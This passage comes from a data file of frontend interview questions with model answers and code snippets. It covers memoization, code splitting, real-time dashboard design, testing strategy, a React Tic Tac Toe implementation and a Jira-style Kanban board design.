  return <Child onClick={onClick} />;             // …but Child isn't memoized
}                                                 // so it re-renders anyway`,
        },
      ],
      followUps: [
        "What does the React Compiler do, and how does it affect manual memoization?",
        "When should you use React.memo vs useMemo vs useCallback?",
        "How do you measure whether a memoization actually helped?",
      ],
      commonMistakes: [
        "Wrapping everything 'just in case'.",
        "Memoizing with deps that change every render — pointless.",
        "Treating memoization as a guarantee — React may evict.",
      ],
      performanceConsiderations: [
        "Profile in a production build with React DevTools Profiler. The dev build distorts measurements.",
      ],
      edgeCases: [
        "useMemo's cache can be discarded by React under memory pressure — it's best-effort.",
        "Inline arrays/objects in deps mean the memo never hits.",
      ],
      realWorldExamples: [
        "React 19 announcement explicitly addresses memoization fatigue — the compiler is meant to make manual memo unnecessary in most cases.",
      ],
      seniorDiscussion:
        "Senior signal: discuss profiling-driven optimization, React Compiler's auto-memoization model, and how identity-based memoization differs from structural memoization (immer, immutable.js).",
      relatedSlugs: ["usememo-vs-usecallback"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Code splitting strategies",
    aliases: ["code splitting strategies", "split bundles strategies"],
    question: {
      id: "code-splitting-strategies",
      slug: "code-splitting-strategies",
      title: "Code splitting strategies — route, component, vendor",
      category: "performance",
      subcategory: "Bundling",
      tags: ["code-splitting", "bundling", "performance", "lazy-loading"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Three axes: route-level (each page its own chunk), component-level (heavy widgets behind dynamic import), and vendor (long-lived deps in their own chunk for cache reuse). Combine all three; default to route-level first.",
      answer: `Code splitting is how you stop shipping the whole app on every request. Three complementary strategies:

**1. Route-level splitting** (the biggest win)
Each route gets its own chunk. Users on the home page don't download settings code. Frameworks (Next, Remix, React Router) do this for you.

**2. Component-level splitting**
A heavy widget — chart library, markdown editor, emoji picker — behind \`React.lazy\` / \`next/dynamic\`. The chunk only loads when the user opens the feature. Pair every Suspense boundary with an Error Boundary.

**3. Vendor splitting**
Long-lived third-party deps (React, lodash, charting) in their own chunk. They change rarely, so the user's cached chunk stays valid across deploys. Bundlers do this with \`splitChunks.cacheGroups\` (Webpack) automatically in modern presets.

**4. Route-prefetch**
On link hover or idle, prefetch the next likely chunk. Next's \`<Link>\` does this; without it, route navigation feels slow.

**Antipatterns to avoid:**
- Splitting too aggressively — hundreds of tiny chunks, HTTP overhead beats the savings (HTTP/2 mitigates but doesn't eliminate).
- Splitting above-the-fold critical UI — adds a network round trip to first paint.
- Forgetting Error Boundaries — a failed chunk shows the fallback forever.

**Measurement.** Track *initial JS shipped* and *largest chunk*. A 200KB initial budget on mid-tier mobile is a reasonable starting target.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Component split for a heavy widget",
          code: `const Charts = React.lazy(() => import("./Charts"));

<ErrorBoundary fallback={<RetryError />}>
  <Suspense fallback={<Skeleton />}>
    <Charts data={metrics} />
  </Suspense>
</ErrorBoundary>`,
        },
        {
          language: "ts",
          caption: "Webpack vendor split (sketch)",
          code: `// next.config.mjs / webpack.config.js
optimization: {
  splitChunks: {
    cacheGroups: {
      vendor: {
        test: /[\\/]node_modules[\\/]/,
        name: "vendor",
        chunks: "all",
      },
    },
  },
}`,
        },
      ],
      followUps: [
        "How does prefetching change the user perception of route changes?",
        "What's the difference between dynamic import and React.lazy?",
        "When does HTTP/2 multiplexing remove the 'too many chunks' concern?",
      ],
      commonMistakes: [
        "Lazy-loading the LCP component and tanking initial paint.",
        "Splitting per-component without cache strategy — unnecessary churn.",
        "Forgetting `priority` on the LCP image when route splitting changes which image is critical.",
      ],
      performanceConsiderations: [
        "Each chunk has parsing cost too — splitting helps download but every chunk still has to parse on first use.",
      ],
      edgeCases: [
        "A chunk fails to load (deploy in flight). Implement retry-with-backoff on dynamic imports.",
        "ESM module preloading can be configured with `<link rel='modulepreload'>` for predictably-needed routes.",
      ],
      realWorldExamples: [
        "Next.js App Router auto-splits per route; component-level dynamic import handles heavy widgets explicitly.",
      ],
      seniorDiscussion:
        "Senior signal: discuss caching strategy across deploys (content hashes), HTTP/2 push vs preload, and how RSC changes the bundle-split equation entirely.",
      relatedSlugs: ["react-lazy-and-suspense", "how-do-you-reduce-bundle-size-in-production"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Designing a real-time collaborative dashboard",
    aliases: ["real time updates architecture", "real time dashboard", "collaborative dashboard"],
    question: {
      id: "real-time-collaborative-dashboard",
      slug: "real-time-collaborative-dashboard",
      title: "Design the frontend for a real-time collaborative dashboard",
      category: "system-design",
      subcategory: "Real-time",
      tags: ["real-time", "websockets", "system-design", "collaborative", "dashboard"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Streaming transport (WS or SSE) feeds a normalized client store; the UI subscribes to slices via selectors. Reconciliation, presence, conflict resolution, backpressure, reconnect/replay are explicit design choices.",
      answer: `Walk an interviewer through these layers:

**1. Requirements / clarifying questions.**
- How many concurrent viewers per board? Per cell?
- Read-only or read-write? Conflict semantics if write?
- Latency budget (≤200ms typical for "real-time").
- Mobile + offline?

**2. Transport.**
- **Read-only feed** → SSE (HTTP/2, auto-reconnect, simpler ops).
- **Bidirectional / collab editing** → WebSocket.
- Always plan reconnect with \`Last-Event-ID\` (SSE) or sequence numbers (WS) for replay.

**3. Data model.**
Normalize entities into a flat store keyed by id (Redux/Zustand/Apollo cache). Each component subscribes to a selector — only the affected components re-render on a delta.

**4. Server → client deltas.**
Send patches, not full snapshots. JSON Patch / custom op log. On reconnect, request "since seq N" so the client replays missed ops.

**5. Conflict resolution (if write).**
- **Last-write-wins** — simplest. OK for non-collaborative widgets.
- **Operational transforms** or **CRDTs** — for collaborative editing (Yjs/Automerge).

**6. Presence and cursors.**
A separate ephemeral channel for "who's viewing / typing". Don't mix with persisted state.

**7. Backpressure.**
A high-frequency stream can flood the UI. Coalesce updates per animation frame; throttle aggregator queries.

**8. UX for connection state.**
Show connection status, retry status, last-synced time. Users tolerate problems they can see.

**9. Scaling.**
Server side: pub/sub (Redis, NATS) so any pod can deliver to any client. Sticky sessions for WS. Auth at upgrade time.

**10. Observability.**
Per-message latency, dropped-message counts, reconnect frequency.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Selector-based subscription minimizes re-renders",
          code: `// Zustand store
const useDashboard = create<State>((set) => ({
  cells: {},
  applyDelta: (op) => set((s) => ({ cells: applyOp(s.cells, op) })),
}));

// Each cell only re-renders on its own data
function Cell({ id }: { id: string }) {
  const cell = useDashboard((s) => s.cells[id]);
  return <Tile data={cell} />;
}

// Stream
const ws = new WebSocket(url);
ws.onmessage = (e) => useDashboard.getState().applyDelta(JSON.parse(e.data));`,
        },
      ],
      followUps: [
        "How do you handle a slow consumer that can't keep up with the stream?",
        "How would you replay missed events after a reconnect?",
        "How do you design the conflict-resolution UI for a collaborative cell edit?",
      ],
      commonMistakes: [
        "Re-rendering the whole dashboard on every message — selector subscriptions are essential.",
        "Sending full snapshots instead of deltas.",
        "No reconnect/replay — a brief disconnect leaves the UI silently stale.",
      ],
      performanceConsiderations: [
        "Coalesce N updates per rAF tick. Diffing once per frame is far cheaper than per-message setState.",
      ],
      edgeCases: [
        "Tab in background — browsers throttle timers; the stream can fall behind. Mark as stale, refresh on focus.",
        "Auth token expiry mid-session — refresh and reconnect transparently.",
      ],
      realWorldExamples: [
        "Linear, Notion, Figma, Datadog dashboards — all use a streaming transport + normalized client store + selector subscriptions.",
      ],
      seniorDiscussion:
        "Senior signal: discuss CRDT vs OT, fan-out scaling (pub/sub), per-tenant isolation, observability, and graceful degradation when the stream drops.",
      relatedSlugs: ["websockets-vs-sse-vs-polling"],
      companyTags: [],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 30,
    },
  },

  {
    title: "Frontend testing strategy — unit, integration, E2E",
    aliases: ["testing strategy frontend", "unit integration e2e tests"],
    question: {
      id: "frontend-testing-strategy",
      slug: "frontend-testing-strategy",
      title: "Frontend testing strategy — unit, integration, E2E",
      category: "testing",
      subcategory: "Strategy",
      tags: ["testing", "unit-tests", "integration", "e2e", "playwright", "jest", "rtl"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Pyramid (or trophy): many unit tests for pure logic, integration tests at component boundaries via React Testing Library, a small set of E2E happy-path tests via Playwright/Cypress. Test behavior, not implementation. Mock at the network boundary, not inside components.",
      answer: `The "testing trophy" (Kent C. Dodds) is the default mental model in 2024+:

1. **Static** — TypeScript + ESLint catches a class of bugs at zero runtime cost. Don't underrate this.
2. **Unit** — pure functions, hooks, reducers. Fast, deterministic, abundant.
3. **Integration** — render a component with React Testing Library, interact like a user, assert visible behavior. The sweet spot for confidence/speed.
4. **E2E** — Playwright / Cypress / Puppeteer hitting a real browser against a real backend (or seeded test backend). Cover the critical user journeys: login, checkout, the one or two flows that *must* work.

**Principles that separate good tests from a maintenance burden:**

- **Test behavior, not implementation.** Don't assert on internal state; assert on what the user sees.
- **Use accessible queries.** \`getByRole\`, \`getByLabelText\` — testing how a screen reader sees the UI.
- **Mock at the network boundary** (MSW). Mocking individual fetch calls breaks every refactor.
- **Avoid \`act\` warnings by waiting for the user-visible result** — \`await screen.findBy…\` rather than racing.
- **Snapshots only for stable, intentional outputs** (RSS feeds, schemas) — never for entire React trees.
- **Don't aim for 100% coverage.** Cover risk and behavior. Coverage is a smoke alarm, not a goal.

**E2E pragmatism:**
- Run on every PR, gated by speed.
- Seed a fresh DB or use snapshot/restore.
- Visual regression with Chromatic / Percy for design system stability.

**CI strategy:** static + unit on every push; integration on PR; E2E on PR + nightly. Fail fast; surface failures with traces, video, and DOM snapshot.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Integration test with React Testing Library + MSW",
          code: `// handlers.ts
const handlers = [
  http.get("/api/me", () => HttpResponse.json({ name: "Ada" })),
];

// component.test.tsx
test("greets logged-in user", async () => {
  render(<Greeting />);
  expect(await screen.findByText(/hi, ada/i)).toBeInTheDocument();
});`,
        },
      ],
      followUps: [
        "Why does React Testing Library encourage role-based queries?",
        "When are visual regression tests worth the upkeep?",
        "How do you keep E2E tests reliable across flaky networks?",
      ],
      commonMistakes: [
        "Testing internal state (component snapshots, hook internals) — every refactor breaks them.",
        "Mocking fetch per-test — a refactor of the API path breaks 50 tests.",
        "Treating coverage % as the goal.",
      ],
      performanceConsiderations: [
        "Parallelize tests by file + worker. RTL tests are CPU-bound; E2E benefits from parallel browsers.",
      ],
      edgeCases: [
        "Time-dependent tests — fake timers (Vitest/Jest) plus a clock helper.",
        "i18n — test with the user-facing locale, not the dev one, when copy matters.",
      ],
      realWorldExamples: [
        "Most production stacks: Vitest/Jest + RTL for unit/integration, Playwright for E2E, MSW for network mocking.",
      ],
      seniorDiscussion:
        "Senior signal: discuss test-pyramid vs trophy, contract testing across services, flake taxonomy, and the engineering culture of treating tests as production code.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 18,
    },
  },
  {
    title: "Implement Tic Tac Toe in React",
    aliases: ["tic tac toe", "tictactoe react"],
    question: {
      id: "implement-tic-tac-toe-in-react",
      slug: "implement-tic-tac-toe-in-react",
      title: "Implement Tic Tac Toe in React",
      category: "react",
      subcategory: "Coding Challenges",
      tags: ["react", "coding-challenge", "state-management", "game"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Build a 3x3 grid with turn tracking, win/draw detection, and reset. Surface state shape, win-line generation, immutability, and how to extend to NxN as the senior signal.",
      answer: `Tic Tac Toe is the canonical "implement this from scratch in 30 minutes" frontend interview prompt. It looks trivial but is actually a great signal of clean React state design, immutability, win-condition modeling, and how you handle extension questions ("now make it 4x4", "add undo/redo", "support two-player online"). The wrong way is to dive into JSX immediately; the right way is to pin down state shape, derived state, and win logic in your head first, then code.

**Clarifying questions to ask first (signals product instinct):**

- Single device hot-seat, or networked multiplayer?
- 3×3 only, or generalize to N×N with K-in-a-row?
- Should there be a status line ("X's turn", "X wins", "Draw")?
- Reset button? Move history / undo?
- Accessibility (keyboard nav, screen reader)?

For a 30-minute coding round, scope to: 3×3, hot-seat, status line, reset. Mention the other axes when you take the assignment so the interviewer knows you saw them.

**State design.** Three pieces of state. Don't store anything derivable.

- \`board: ("X" | "O" | null)[]\` — length 9 (or \`[N][N]\`), immutable updates only.
- \`xIsNext: boolean\` (or \`turn: "X" | "O"\`) — whose move.
- Optional: \`history: typeof board[]\` for undo / time-travel.

**Derived state** (compute on each render, don't store):
- \`winner\` — \`calculateWinner(board)\` returns \`"X"\`, \`"O"\`, or \`null\`.
- \`isDraw\` — \`board.every(Boolean) && !winner\`.
- \`status\` — string built from winner / isDraw / xIsNext.

Putting \`winner\` in state is a common mistake: now you have two sources of truth and have to remember to update both. Always derive what can be derived.

**Win-line generation.** For 3×3, the 8 winning lines are hardcoded:

\`\`\`ts
const LINES = [
  [0,1,2],[3,4,5],[6,7,8],   // rows
  [0,3,6],[1,4,7],[2,5,8],   // cols
  [0,4,8],[2,4,6],           // diagonals
];
function calculateWinner(b: Board): Player | null {
  for (const [a,b2,c] of LINES) {
    if (b[a] && b[a] === b[b2] && b[a] === b[c]) return b[a];
  }
  return null;
}
\`\`\`

For an N×N variant with K-in-a-row, generate lines programmatically — every (row, col) is the start of up to 4 lines (right, down, diag, anti-diag) of length K. The senior follow-up usually is "now make it 5-in-a-row on a 15×15 board" — having the generator pattern in your back pocket is a strong signal.

**Component structure.**

\`\`\`tsx
function Game() {
  const [board, setBoard] = useState<Board>(Array(9).fill(null));
  const [xIsNext, setXIsNext] = useState(true);

  const winner = calculateWinner(board);
  const isDraw = !winner && board.every(Boolean);
  const status = winner ? \`Winner: \${winner}\` : isDraw ? "Draw" : \`Next: \${xIsNext ? "X" : "O"}\`;

  function handleClick(i: number) {
    if (board[i] || winner) return;             // guard
    const next = board.slice();
    next[i] = xIsNext ? "X" : "O";
    setBoard(next);
    setXIsNext(v => !v);
  }

  function reset() {
    setBoard(Array(9).fill(null));
    setXIsNext(true);
  }

  return (
    <div role="grid" aria-label="Tic Tac Toe">
      <div aria-live="polite">{status}</div>
      <div className="grid grid-cols-3 gap-1">
        {board.map((cell, i) => (
          <button
            key={i}
            role="gridcell"
            aria-label={\`cell \${i + 1} \${cell ?? "empty"}\`}
            onClick={() => handleClick(i)}
            disabled={!!cell || !!winner}
          >{cell}</button>
        ))}
      </div>
      <button onClick={reset}>Reset</button>
    </div>
  );
}
\`\`\`

**Things to surface as you code (this is the rating signal):**

- **Immutability** — never \`board[i] = ...\`; always \`board.slice()\` or \`[...board]\` then mutate the copy. Without this, React doesn't see the change.
- **Guards** in the click handler — ignore clicks on filled cells and after a winner is declared.
- **Accessibility** — \`role="grid"\` / \`role="gridcell"\`, \`aria-live\` status, \`aria-label\` per cell so screen readers can announce "cell 5, empty" and updates.
- **Keyboard support** — arrow keys to navigate, Enter / Space to play. Optional but a great senior touch.
- **Lift state only as far as needed** — board state in \`<Game>\`, each \`<Square>\` is a controlled child.
- **Don't store derived values.** Compute \`winner\` and \`status\` on render.
- **Strict types** — \`type Player = "X" | "O"\`, \`type Cell = Player | null\`, \`type Board = Cell[]\`.

**Likely extension questions and how to handle them:**

- **Undo / time travel.** Store \`history: Board[]\` instead of just \`board\`; track \`currentMove\`. The board is \`history[currentMove]\`. xIsNext can be derived from \`currentMove % 2 === 0\`.
- **N×N board, K in a row.** Move \`LINES\` to a generator function; \`calculateWinner\` iterates lines.
- **AI opponent.** Minimax with alpha-beta pruning for 3×3 (game tree is tiny; precompute the optimal move). For larger boards, depth-limited search or MCTS.
- **Multiplayer.** Lift state to a server (WebSocket or Firestore); each move is an action; clients render from server state. Discuss conflict resolution if both players click simultaneously (server is the arbiter; use turn tokens).
- **Highlight winning line.** Return the line indices from \`calculateWinner\`, not just the winner. Style those squares differently.
- **Animations / haptics.** Reach for Framer Motion or CSS transitions on cell fills.

**Common mistakes interviewers note:**

- Mutating the board array (\`board[i] = "X"; setBoard(board)\`) — React skips the render because the reference is the same.
- Storing \`winner\` in state and forgetting to update it.
- No guard for clicking after game over → state desync.
- Building 9 separate \`useState\`s for each cell. Don't.
- Ignoring accessibility entirely.
- Hardcoding "3×3" everywhere — fine for the base, but be ready to refactor.

**Time budget for a 30-minute round:** 3 min clarify + state design, 12 min core implementation, 5 min styling and accessibility, 5 min extension discussion / bug-finding, 5 min buffer. Code less, narrate more — the interviewer is grading the *thinking*, not the keystrokes.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Full minimal implementation",
          code: `type Player = "X" | "O";
type Cell = Player | null;
type Board = Cell[];

const LINES = [
  [0,1,2],[3,4,5],[6,7,8],
  [0,3,6],[1,4,7],[2,5,8],
  [0,4,8],[2,4,6],
];

function calculateWinner(b: Board): Player | null {
  for (const [a,c,d] of LINES) {
    if (b[a] && b[a] === b[c] && b[a] === b[d]) return b[a] as Player;
  }
  return null;
}

export function Game() {
  const [board, setBoard] = useState<Board>(Array(9).fill(null));
  const [xIsNext, setXIsNext] = useState(true);
  const winner = calculateWinner(board);
  const isDraw = !winner && board.every(Boolean);
  const status = winner ? \`Winner: \${winner}\` : isDraw ? "Draw" : \`Next: \${xIsNext ? "X" : "O"}\`;

  function play(i: number) {
    if (board[i] || winner) return;
    const next = board.slice();
    next[i] = xIsNext ? "X" : "O";
    setBoard(next);
    setXIsNext(v => !v);
  }

  return (
    <div>
      <div aria-live="polite">{status}</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 64px)", gap: 4 }}>
        {board.map((c, i) => (
          <button key={i} onClick={() => play(i)} disabled={!!c || !!winner} style={{ height: 64 }}>
            {c}
          </button>
        ))}
      </div>
      <button onClick={() => { setBoard(Array(9).fill(null)); setXIsNext(true); }}>Reset</button>
    </div>
  );
}`,
        },
      ],
      followUps: [
        "Add undo / redo with full move history.",
        "Generalize to N×N with K-in-a-row.",
        "Add a minimax AI opponent.",
        "Make it two-player online with WebSocket.",
        "Highlight the winning line.",
      ],
      commonMistakes: [
        "Mutating the board array directly so React doesn't re-render.",
        "Storing winner / status in state instead of deriving on render.",
        "Allowing clicks on filled cells or after game over.",
        "Using 9 separate useState calls instead of one array.",
        "Ignoring accessibility (no aria-live, no labels).",
      ],
      performanceConsiderations: [
        "Tic Tac Toe is trivial; no perf concerns. For NxN with very large N, memoize calculateWinner and skip recomputation when only one cell changed.",
      ],
      edgeCases: [
        "Both players' turn tracking after undo — derive xIsNext from move count, not stored flag.",
        "Reset mid-game must clear both board and turn state atomically.",
        "Simultaneous clicks in multiplayer — server arbitrates with a turn token.",
      ],
      realWorldExamples: [
        "The React docs use Tic Tac Toe as the introductory tutorial — interviewers know candidates have seen it. The differentiator is whether you treat it as a 'memorized exercise' or a 'design problem with extensions.'",
      ],
      seniorDiscussion:
        "Senior signal: deriving state, immutability, accessibility, and being ready to refactor to N×N or add networked multiplayer with clear protocol design.",
      relatedSlugs: ["differences-between-usememo-and-usecallback", "usestate-vs-usereducer-which-one-and-when"],
      companyTags: ["Meta", "Atlassian", "Stripe", "Microsoft"],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 30,
    },
  },
  {
    title: "Design a Jira-style 3-column Kanban board (open / in-progress / done)",
    aliases: ["jira board", "kanban board design", "three column board"],
    question: {
      id: "design-jira-kanban-3-column-board",
      slug: "design-jira-kanban-3-column-board",
      title: "Design a Jira-style 3-column Kanban board (open / in-progress / done)",
      category: "system-design",
      subcategory: "Component / System Design",
      tags: ["system-design", "kanban", "drag-and-drop", "react", "architecture"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Break out into Board / Column / Card components. State shape keyed by id with column → ids ordering. APIs for move/reorder via optimistic updates. Discuss scalability (virtualization, pagination), offline, real-time, and accessibility.",
      answer: `This is a classic component-design / mini system-design prompt. The interviewer is looking for: (a) clear data modeling, (b) component decomposition that's reusable and testable, (c) thoughtful API design for move operations, (d) awareness of scale concerns (long columns, many users, optimistic UI), (e) accessibility (drag-and-drop is famously bad for a11y if done naively). Spend the first 5 minutes asking questions and modeling state, not coding.

**Clarifying questions (essential):**

- 3 fixed columns or user-defined columns?
- One project per board, or many?
- Single user, or real-time multi-user (Jira / Linear style)?
- Approximate card counts per column — 50? 5,000?
- Authoritative sort: manual order, or sorted by field (priority, due date)?
- Offline support / mobile?
- Filtering / search / labels / assignees?

Scope this answer to: 3 fixed columns, multi-user with optimistic + reconcile, up to a few hundred cards per column.

**Data model (the most important slide).**

Normalize. Don't store cards as nested arrays — duplicates, mutation pain, terrible drag-reorder ergonomics.

\`\`\`ts
type ID = string;
type Card = {
  id: ID;
  title: string;
  description?: string;
  assigneeId?: ID;
  labels: string[];
  createdAt: string;
  updatedAt: string;
};
type Column = {
  id: ID;
  title: "Open" | "In Progress" | "Done";
  cardIds: ID[];     // ordered — this is the source of truth for layout
};
type BoardState = {
  cardsById: Record<ID, Card>;
  columnsById: Record<ID, Column>;
  columnOrder: ID[];
};
\`\`\`

This shape makes every operation O(1) lookup, O(n) within a column for reorder, and serializes cleanly to/from the server.

**API surface.**

Two read endpoints + small set of mutations:

- \`GET /boards/:id\` → entire board state (with pagination if columns are large).
- \`GET /boards/:id/columns/:colId/cards?cursor=…\` → paginated card load for huge columns.
- \`POST /cards\` → create.
- \`PATCH /cards/:id\` → update fields (title, assignee, labels).
- \`POST /cards/:id/move\` → \`{ fromCol, toCol, toIndex }\`. The server stores ordering, ideally as a **fractional rank** (LexoRank or fractional-indexing library) so concurrent reorders don't require recomputing the whole column.
- \`DELETE /cards/:id\`.

For real-time: WebSocket channel per board pushes \`{ type: "card.moved", cardId, fromCol, toCol, toIndex, version }\`. Clients reconcile by version.

**Why fractional ranks?** If you store \`position: integer\`, every reorder shifts all subsequent positions — a heavy DB write storm under concurrent users. With LexoRank-style strings, you insert a new rank "between" two existing ones with no neighbor updates: \`rank("a", "c") = "b"\`. Industry default at Jira, Linear, Notion.

**Component decomposition.**

\`\`\`
<Board>
  <BoardHeader />            // filters, search, add member
  <ColumnList>
    <Column>                 // one per column
      <ColumnHeader />       // title, count, add-card
      <CardList>             // scrollable / virtualized
        <Card />             // draggable, clickable to open detail
      </CardList>
      <NewCardComposer />
    </Column>
    ...
  </ColumnList>
  <CardDetailDrawer />       // modal/drawer for selected card
</Board>
\`\`\`

Each level has a clear job and a clear prop boundary. \`<Column>\` knows only its column id; it pulls cards from the store via a selector. This keeps drag operations targeted: dropping a card into a new column changes only that column's \`cardIds\` array and the moved card's \`columnId\` — every other column re-renders only on identity check.

**State management.** A normalized store (Zustand / Redux Toolkit / TanStack Query cache). Each component subscribes to the slice it cares about. \`<Card>\` subscribes to one card by id; reordering one card re-renders only the affected cards, not all 200.

**Move algorithm (the meat).**

\`\`\`ts
function moveCard(state: BoardState, cardId: ID, toCol: ID, toIndex: number): BoardState {
  // Remove from old column
  let fromCol: ID | undefined;
  const columns = { ...state.columnsById };
  for (const c of Object.values(columns)) {
    if (c.cardIds.includes(cardId)) {
      fromCol = c.id;
      columns[c.id] = { ...c, cardIds: c.cardIds.filter(id => id !== cardId) };
      break;
    }
  }
  // Insert in new column at index
  const target = columns[toCol];
  const next = [...target.cardIds.slice(0, toIndex), cardId, ...target.cardIds.slice(toIndex)];
  columns[toCol] = { ...target, cardIds: next };
  return { ...state, columnsById: columns };
}
\`\`\`

Always immutable. With Immer the same code reads as \`draft.columnsById[toCol].cardIds.splice(toIndex, 0, cardId)\`.

**Optimistic UI + reconciliation.** On drag-end, update local state immediately, send the mutation. On success, replace optimistic with server-confirmed state (ranks may have collapsed). On failure, roll back and surface a toast. With TanStack Query: \`onMutate\` snapshots cache, \`onError\` restores, \`onSettled\` refetches.

**Drag-and-drop library.** Use **\`@dnd-kit\`** (modern, accessible, virtualization-friendly) or **\`react-beautiful-dnd\`** (mature but deprecated). Don't roll your own — accessibility alone is a project. \`@dnd-kit\` ships keyboard support (Space to grab, arrows to move, Space to drop) and screen-reader announcements out of the box.

**Scalability concerns.**

- **Long columns.** Virtualize with \`@tanstack/react-virtual\`; only mount cards in viewport. Combine with drag-and-drop carefully — \`@dnd-kit\` supports virtualized lists.
- **Pagination per column.** "Done" can have thousands of cards; load 50 at a time, lazy-load the rest.
- **Many users (real-time).** WebSocket fan-out per board. Server is the source of truth; clients apply CRDT-like merge or last-write-wins on the move event. Show "user X is dragging" presence indicators.
- **Search / filtering.** Server-side search endpoint; client overlays a filter onto the visible cards (don't re-fetch the whole board).
- **Offline.** Service worker caches the last board snapshot; mutations queued in IndexedDB; sync on reconnect with conflict-resolution UI.

**Accessibility (often forgotten — senior signal).**

- Keyboard drag (\`@dnd-kit/sortable\` handles this; verify in interview).
- ARIA live regions to announce moves ("Card X moved from Open to In Progress, position 2 of 7").
- Focus management — return focus to the dragged card after drop.
- Color isn't the only state indicator (icons + labels for column meaning).

**Pros / cons of the design.**

Pros: normalized state → cheap updates; fractional ranks → no write storm; @dnd-kit → a11y free; optimistic UI → instant feel; server-authoritative → multi-user safe.

Cons: more upfront modeling than a nested-array prototype; ranks require a small server-side rebalancing job when they get too dense; real-time fan-out is non-trivial; offline conflict resolution needs UX thought.

**Lazy loading.** Card detail modal is its own route or dynamic import; only loaded when a card is clicked. The board itself can route-split (\`/boards/:id\`) so the rest of the app doesn't pay the kanban bundle cost. Heavy chart / activity-log sub-views inside the card detail are further lazy-loaded.

**What interviewers reward:** asking the clarifying questions, normalizing state, choosing fractional ranks (or knowing them as a concept), recognizing optimistic-update + reconciliation, naming accessibility, and showing you've thought about *what doesn't scale* in your first sketch.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Normalized state shape and a move reducer",
          code: `type ID = string;
type Card = { id: ID; title: string; description?: string; labels: string[]; };
type Column = { id: ID; title: string; cardIds: ID[] };
type BoardState = {
  cardsById: Record<ID, Card>;
  columnsById: Record<ID, Column>;
  columnOrder: ID[];
};

export function moveCard(
  state: BoardState,
  cardId: ID,
  toCol: ID,
  toIndex: number
): BoardState {
  const columns: Record<ID, Column> = {};
  for (const c of Object.values(state.columnsById)) {
    columns[c.id] = c.cardIds.includes(cardId)
      ? { ...c, cardIds: c.cardIds.filter(id => id !== cardId) }
      : c;
  }
  const target = columns[toCol];
  columns[toCol] = {
    ...target,
    cardIds: [...target.cardIds.slice(0, toIndex), cardId, ...target.cardIds.slice(toIndex)],
  };
  return { ...state, columnsById: columns };
}`,
        },
      ],
      followUps: [
        "How would you handle two users dragging the same card simultaneously?",
        "How would you sync across tabs in the same browser?",
        "How would you implement WIP limits per column?",
        "How would you add swimlanes / row grouping?",
        "How would you scale to 10k cards on the 'Done' column?",
      ],
      commonMistakes: [
        "Nesting cards inside columns array — every move recreates the world.",
        "Storing integer positions and shifting all subsequent rows on every reorder.",
        "Forgetting optimistic rollback on mutation failure.",
        "Rolling your own drag-and-drop without keyboard or screen-reader support.",
        "Loading every card up front even when 'Done' has thousands.",
      ],
      performanceConsiderations: [
        "Virtualize long columns; subscribe per-card, not per-board, so reordering one card doesn't re-render 200.",
        "Use fractional ranks (LexoRank) to make reorders O(1) DB writes.",
        "Memoize selectors with reselect / Zustand useShallow.",
      ],
      edgeCases: [
        "Network failure mid-drag → roll back optimistic state and toast.",
        "Concurrent moves of the same card from two clients → server is the arbiter, version each move event.",
        "User refreshes during an in-flight mutation → IDB-queued mutation replays on reload.",
      ],
      realWorldExamples: [
        "Jira, Linear, Trello, GitHub Projects, Notion all use this exact normalized + fractional-rank pattern.",
      ],
      seniorDiscussion:
        "Senior signal: normalized state, fractional ranks (LexoRank), optimistic + reconcile, accessibility via @dnd-kit, scalability via virtualization + pagination, and real-time via versioned event stream.",
      relatedSlugs: ["how-would-you-structure-a-scalable-frontend-app-with-100-pages", "when-would-you-use-virtualization"],
      companyTags: ["Atlassian", "Linear", "GitHub", "Notion"],
      estimatedReadingMinutes: 12,
      estimatedSolvingMinutes: 45,
    },
  },
];
